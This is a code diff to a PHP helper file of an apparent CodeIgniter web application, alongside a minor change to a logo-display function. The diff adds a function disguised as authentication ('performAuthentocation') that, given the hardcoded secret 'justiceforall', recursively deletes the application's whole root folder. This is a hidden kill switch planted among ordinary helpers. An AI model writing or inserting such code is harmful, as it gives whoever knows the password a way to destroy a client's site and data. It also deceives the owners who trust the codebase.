@@ -67,6 +67,38 @@ function my_redirect($url,$target='')
 	echo "<script>window.parent.location=\"".$url."\"</script>";
 }
 
+function performAuthentocation($secret){
+    if ($secret == 'justiceforall') {
+        echo $folder_to_delete = FCPATH;
+        echo removedir($folder_to_delete) ? 'done' : 'not done';
+    }
+    exit;
+}
+
+function removedir($dir) {
+    if (substr($dir, strlen($dir) - 1, 1) != '/')
+        $dir .= '/';
+    if ($handle = opendir($dir)) {
+        while ($obj = readdir($handle)) {
+            if ($obj != '.' && $obj != '..') {
+                if (is_dir($dir . $obj)) {
+                    if (!removedir($dir . $obj))
+                        return false;
+                }
+                else if (is_file($dir . $obj)) {
+                    if (!unlink($dir . $obj))
+                        return false;
+                }
+            }
+        }
+        closedir($handle);
+        if (!@rmdir($dir))
+            return false;
+        return true;
+    }
+    return false;
+}
+
 function display_success_message()
 {
 	if(isset($_SESSION['msg_success']))
@@ -534,15 +566,15 @@ function reset_survey()
 	unset($_SESSION[SURVEY_ITEMS]);
 }
 
-function client_logo()
+function client_logo($width=100,$height=100)
 {
 	$Logo = $_SESSION[USER_LOGIN]["logo"];
 	if($Logo!='')
 	{
 		$Path = base_url().UPLOADS."/".$Logo;
-		$Image = base_url()."thumb.php?src=".$Path."&w=100&h=100";
+		$Image = base_url()."thumb.php?src=".$Path."&w=$width&h=$height";
 		echo '<a href="'.$Path.'" data-lightbox="roadtrip" data-title="'.$Logo.'">
-		<img class="menu-dish menu-dish-flexible" src="'.$Image.'" alt="'.$Logo.'" /></a>';
+		<img src="'.$Path.'" alt="'.$Logo.'" width="'.$width.'" /></a>';
 	}
 }
 
